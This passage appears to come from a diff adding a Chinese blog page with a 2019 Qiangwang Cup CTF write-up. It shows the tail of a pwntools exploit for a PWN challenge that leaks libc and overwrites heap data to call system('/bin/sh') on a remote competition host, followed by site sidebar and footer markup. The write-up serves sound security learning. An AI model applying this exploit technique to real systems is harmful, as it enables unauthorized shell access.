libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">    info(&quot;leak info: %#x&quot; % ttt)</span><br><span class="line">    info(&quot;libc_base: %#x&quot; % base)</span><br><span class="line">    info(&quot;system_addr: %#x&quot; % addr)</span><br><span class="line">    info(&quot;bin_sh: %#x&quot; % sh)</span><br><span class="line"></span><br><span class="line">    s.recvuntil(&quot;Choice &gt;&gt; \n&quot;)</span><br><span class="line">    s.sendline(&quot;3&quot;)</span><br><span class="line">    s.recvuntil(&quot;it&apos;s owner&apos;s name?\n&quot;)</span><br><span class="line">    s.sendline(&quot;0&quot;)</span><br><span class="line">    s.recvuntil(&quot;The length of my owner&apos;s name:\n&quot;)</span><br><span class="line">    s.sendline(&quot;60&quot;)</span><br><span class="line">    s.recvuntil(&quot;Give me my owner&apos;s name:\n&quot;)</span><br><span class="line">    payload  = &quot;&quot;</span><br><span class="line">    payload += &apos;a&apos;*16</span><br><span class="line">    payload += &apos;a&apos;*8+p64(0x21)</span><br><span class="line">    payload += p64(sh) + p64(addr)</span><br><span class="line">    s.send(payload)</span><br><span class="line"></span><br><span class="line">    s.recvuntil(&quot;Choice &gt;&gt; \n&quot;)</span><br><span class="line">    s.sendline(&quot;2&quot;)</span><br><span class="line">    s.recvuntil(&quot;open?\n&quot;)</span><br><span class="line">    s.send(&quot;1\n&quot;)</span><br><span class="line"></span><br><span class="line">    s.interactive()</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    if sys.argv[1] == &apos;local&apos;:</span><br><span class="line">        s = process(&quot;./task_main&quot;)</span><br><span class="line">        libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, checksec = False)</span><br><span class="line">    else:</span><br><span class="line">        s = remote(&quot;117.78.60.139&quot;, 31043)</span><br><span class="line">        libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;, checksec = False)</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/23/同源策略以及出现的各类安全问题/" rel="next" title="同源策略以及出现的各类安全问题">
+                <i class="fa fa-chevron-left"></i> 同源策略以及出现的各类安全问题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">故人梦</p>
+              <p class="site-description motion-element" itemprop="description">人的一生应该这样度过:不因虚度年华而悔恨，也不因碌碌无为而羞愧</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC"><span class="nav-number">1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#签到题"><span class="nav-number">1.1.</span> <span class="nav-text">签到题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CRYPTO"><span class="nav-number">2.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#强网先锋-辅助"><span class="nav-number">2.1.</span> <span class="nav-text">强网先锋-辅助</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WEB"><span class="nav-number">3.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#upload"><span class="nav-number">3.1.</span> <span class="nav-text">upload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#强网先锋-上单"><span class="nav-number">3.2.</span> <span class="nav-text">强网先锋-上单</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#随便注"><span class="nav-number">3.3.</span> <span class="nav-text">随便注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#REVERSE"><span class="nav-number">4.</span> <span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#强网先锋-AD"><span class="nav-number">4.1.</span> <span class="nav-text">强网先锋_AD</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PWN"><span class="nav-number">5.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#强网先锋-AP"><span class="nav-number">5.1.</span> <span class="nav-text">强网先锋-AP</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">故人梦</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">15.0k</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
